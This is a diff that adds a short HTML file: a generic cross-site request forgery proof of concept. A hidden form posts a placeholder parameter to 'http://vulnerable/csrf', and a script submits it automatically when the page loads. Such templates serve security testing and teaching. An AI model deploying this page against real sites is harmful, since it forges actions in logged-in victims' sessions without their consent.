@@ -1,0 +1,10 @@
+<html> 
+    <body>
+	    <form action="http://vulnerable/csrf" method="POST"> 
+		    <input type="hidden" name="param" value="value"/>
+	    </form> 
+    </body>
+	<script> 
+		document.forms[0].submit();
+	</script> 
+</html>
